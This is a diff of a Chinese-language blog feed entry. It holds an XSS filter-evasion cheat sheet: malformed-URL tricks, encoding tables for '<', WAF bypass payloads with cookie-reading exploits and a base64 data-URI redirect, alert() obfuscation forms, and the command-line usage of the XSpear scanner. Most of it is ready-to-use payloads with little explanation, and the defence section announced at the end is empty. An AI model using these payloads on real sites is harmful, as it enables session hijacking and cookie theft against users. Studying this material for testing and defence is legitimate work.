-&lt;p&gt;&lt;strong&gt;Google的”feeling lucky”功能2&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;这使用了一个仅在FireFox上有效的小技巧，因为它实现了”feelinglucky”功能。不像下面一个例子，这个在Opera上无效因为Opera会认为只是一个老式的HTTP基础认证钓鱼攻击，但它并不是。它只是一个畸形的URL。如果你点击了对话框的确定，它就可以生效。但是在Opera上会是一个错误对话框，所以认为其不被Opera所支持，同样在Firefox2.0后不再有效。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://ha.ckers.org@google&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;Google的”feeling lucky”功能3&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;这是一个畸形的URL只在FireFox和Opera下有效，因为它们实现了”feeling lucky”功能。像上面的例子一样，它要求你的攻击页面在Google上特定关键词排名第一（在这个示例里关键词是”google”）&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://google:ha.ckers.org&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;移除别名&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;当结合上面的URL，移除”www.”会节约4个字节，总共为正确设置的服务器节省9字节:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;A HREF=&quot;http://google.com/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;绝对DNS名称后额外的点&lt;/strong&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://www.google.com./&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;JavaScriptlink location&lt;/strong&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;javascript:document.location='http://www.google.com/'&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;内容替换作为攻击向量&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;假设”http://www.google.com/”会自动替换为空。我实际使用过类似的攻击向量即通过使用转换过滤器本身（示例如下）来帮助构建攻击向量以对抗现实世界的XSS过滤器:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;A HREF=&quot;http://www.google.com/ogle.com/&quot;&amp;gt;XSS&amp;lt;/A&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;字符转义表&quot;&gt;字符转义表&lt;/h2&gt;
-
-&lt;p&gt;下面是HTML和JavaScript中字符“&amp;lt;”的所有可能组合。其中大部分不会被渲染出来，但其中许多可以在某些情况下呈现出来。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;
-%3C
-&amp;amp;lt
-&amp;amp;lt;
-&amp;amp;LT
-&amp;amp;LT;
-&amp;amp;#60
-&amp;amp;#060
-&amp;amp;#0060
-&amp;amp;#00060
-&amp;amp;#000060
-&amp;amp;#0000060
-&amp;amp;#60;
-&amp;amp;#060;
-&amp;amp;#0060;
-&amp;amp;#00060;
-&amp;amp;#000060;
-&amp;amp;#0000060;
-&amp;amp;#x3c
-&amp;amp;#x03c
-&amp;amp;#x003c
-&amp;amp;#x0003c
-&amp;amp;#x00003c
-&amp;amp;#x000003c
-&amp;amp;#x3c;
-&amp;amp;#x03c;
-&amp;amp;#x003c;
-&amp;amp;#x0003c;
-&amp;amp;#x00003c;
-&amp;amp;#x000003c;
-&amp;amp;#X3c
-&amp;amp;#X03c
-&amp;amp;#X003c
-&amp;amp;#X0003c
-&amp;amp;#X00003c
-&amp;amp;#X000003c
-&amp;amp;#X3c;
-&amp;amp;#X03c;
-&amp;amp;#X003c;
-&amp;amp;#X0003c;
-&amp;amp;#X00003c;
-&amp;amp;#X000003c;
-&amp;amp;#x3C
-&amp;amp;#x03C
-&amp;amp;#x003C
-&amp;amp;#x0003C
-&amp;amp;#x00003C
-&amp;amp;#x000003C
-&amp;amp;#x3C;
-&amp;amp;#x03C;
-&amp;amp;#x003C;
-&amp;amp;#x0003C;
-&amp;amp;#x00003C;
-&amp;amp;#x000003C;
-&amp;amp;#X3C
-&amp;amp;#X03C
-&amp;amp;#X003C
-&amp;amp;#X0003C
-&amp;amp;#X00003C
-&amp;amp;#X000003C
-&amp;amp;#X3C;
-&amp;amp;#X03C;
-&amp;amp;#X003C;
-&amp;amp;#X0003C;
-&amp;amp;#X00003C;
-&amp;amp;#X000003C;
-\x3c
-\x3C
-\u003c
-\u003C
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;绕过waf的方法&quot;&gt;绕过WAF的方法&lt;/h1&gt;
-
-&lt;h2 id=&quot;通用问题&quot;&gt;通用问题&lt;/h2&gt;
-
-&lt;h3 id=&quot;存储型xss&quot;&gt;存储型XSS&lt;/h3&gt;
-
-&lt;p&gt;如果攻击者已经让XSS绕过过滤器，WAF无法阻止攻击透过&lt;/p&gt;
-
-&lt;h3 id=&quot;基于javascript的反射型xss&quot;&gt;基于JavaScript的反射型XSS&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;示例: &amp;lt;script&amp;gt; ... setTimeout(\&quot;writetitle()\&quot;,$_GET[xss]) ... &amp;lt;/script&amp;gt;
-
-利用: /?xss=500); alert(document.cookie);//
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;基于dom的xss&quot;&gt;基于DOM的XSS&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;示例: &amp;lt;script&amp;gt; ... eval($_GET[xss]); ... &amp;lt;/script&amp;gt;
-
-利用: /?xss=document.cookie
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;通过请求重定向构造xss&quot;&gt;&lt;strong&gt;通过请求重定向构造XSS&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;存在漏洞代码:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;    ...
-
-     header('Location: '.$_GET['param']);
-
-    ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;同样包括:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;    ...
-
-     header('Refresh: 0; URL='.$_GET['param']);
-
-    ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这种请求不会绕过WAF:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;/?param=javascript:alert(document.cookie)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这种请求可以绕过WAF并且XSS攻击可以在某些浏览器执行:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;/?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;绕过&lt;/strong&gt;WAF可用&lt;strong&gt;字符串.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;    &amp;lt;Img src = x onerror = &quot;javascript: window.onerror = alert; throw XSS&quot;&amp;gt;
-
-    &amp;lt;Video&amp;gt; &amp;lt;source onerror = &quot;javascript: alert (XSS)&quot;&amp;gt;
-
-    &amp;lt;Input value = &quot;XSS&quot; type = text&amp;gt;
-
-    &amp;lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&amp;gt;
-
-    &amp;lt;isindex x=&quot;javascript:&quot; onmouseover=&quot;alert(XSS)&quot;&amp;gt;
-
-    &quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;”&amp;gt;’&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;
-
-    &quot;&amp;gt;&amp;lt;img src=&quot;x:x&quot; onerror=&quot;alert(XSS)&quot;&amp;gt;
-
-    &quot;&amp;gt;&amp;lt;iframe src=&quot;javascript:alert(XSS)&quot;&amp;gt;
-
-    &amp;lt;object data=&quot;javascript:alert(XSS)&quot;&amp;gt;
-
-    &amp;lt;isindex type=image src=1 onerror=alert(XSS)&amp;gt;
-
-    &amp;lt;img src=x:alert(alt) onerror=eval(src) alt=0&amp;gt;
-
-    &amp;lt;img  src=&quot;x:gif&quot; onerror=&quot;window['al\u0065rt'](0)&quot;&amp;gt;&amp;lt;/img&amp;gt;
-
-    &amp;lt;iframe/src=&quot;data:text/html,&amp;lt;svg onload=alert(1)&amp;gt;&quot;&amp;gt;
-
-    &amp;lt;meta content=&quot;&amp;amp;NewLine; 1 &amp;amp;NewLine;; JAVASCRIPT&amp;amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&amp;gt;
-
-    &amp;lt;svg&amp;gt;&amp;lt;script xlink:href=data&amp;amp;colon;,window.open('https://www.google.com/')&amp;gt;&amp;lt;/script
-
-    &amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&amp;gt;
-
-    &amp;lt;iframe src=javascript&amp;amp;colon;alert&amp;amp;lpar;document&amp;amp;period;location&amp;amp;rpar;&amp;gt;
-
-    &amp;lt;form&amp;gt;&amp;lt;a href=&quot;javascript:\u0061lert(1)&quot;&amp;gt;X
-
-    &amp;lt;/script&amp;gt;&amp;lt;img/*%00/src=&quot;worksinchrome&amp;amp;colon;prompt(1)&quot;/%00*/onerror='eval(src)'&amp;gt;
-
-    &amp;lt;style&amp;gt;//*{x:expression(alert(/xss/))}//&amp;lt;style&amp;gt;&amp;lt;/style&amp;gt; 
-
-    On Mouse Over​
-
-    &amp;lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror='prompt(1)'&quot;&amp;gt;
-
-    &amp;lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;amp;#97v&amp;amp;#97script:&amp;amp;#97lert(1)&amp;gt;ClickMe
-
-    &amp;lt;script x&amp;gt; alert(1) &amp;lt;/script 1=2
-
-    &amp;lt;form&amp;gt;&amp;lt;button formaction=javascript&amp;amp;colon;alert(1)&amp;gt;CLICKME
-
-    &amp;lt;input/onmouseover=&quot;javaSCRIPT&amp;amp;colon;confirm&amp;amp;lpar;1&amp;amp;rpar;&quot;
-
-    &amp;lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;alert混淆以绕过过滤器&quot;&gt;Alert混淆以绕过过滤器&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;(alert)(1)
-
-a=alert,a(1)
-
-[1].find(alert)
-
-top[“al”+”ert”](1)
-
-top[/al/.source+/ert/.source](1)
-
-al\u0065rt(1)
-
-top[‘al\145rt’](1)
-
-top[‘al\x65rt’](1)
-
-top[8680439..toString(30)](1)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;xss扫描工具&quot;&gt;xss扫描工具&lt;/h1&gt;
-
-&lt;p&gt;xspear&lt;/p&gt;
-
-&lt;p&gt;安装:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gem install XSpear
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;需要root用户&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;基础用法&quot;&gt;基础用法&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Usage: xspear -u [target] -[options] [value]
-[ e.g ]
-$ xspear -u 'https://www.hahwul.com/?q=123' --cookie='role=admin' -v 1 -a 
-$ xspear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 2
-$ xspear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 0 -o json
-
-[ Options ]
-    -u, --url=target_URL             [required] Target Url
-    -d, --data=POST Body             [optional] POST Method Body data
-    -a, --test-all-params            [optional] test to all params(include not reflected)
-        --no-xss                     [optional] no testing xss, only parameters analysis
-        --headers=HEADERS            [optional] Add HTTP Headers
-        --cookie=COOKIE              [optional] Add Cookie
-        --custom-payload=FILENAME    [optional] Load custom payload json file
-        --raw=FILENAME               [optional] Load raw file(e.g raw_sample.txt)
-        --raw-ssl=BOOLEAN            [optional] http/https switch for burp raw file e.g: true/false
-    -p, --param=PARAM                [optional] Test paramters
-    -b, --BLIND=URL                  [optional] Add vector of Blind XSS
-                                      + with XSS Hunter, ezXSS, HBXSS, etc...
-                                      + e.g : -b https://hahwul.xss.ht
-    -t, --threads=NUMBER             [optional] thread , default: 10
-    -o, --output=FORMAT              [optional] Output format (cli , json, html)
-    -c, --config=FILENAME            [optional] Using config.json
-    -v, --verbose=0~3                [optional] Show log depth
-                                      + v=0 : quite mode(only result)
-                                      + v=1 : show scanning status(default)
-                                      + v=2 : show scanning logs
-                                      + v=3 : show detail log(req/res)
-    -h, --help                       Prints this help
-        --version                    Show XSpear version
-        --update                     Show how to update
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h1 id=&quot;xss防范&quot;&gt;xss防范&lt;/h1&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>
+&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>
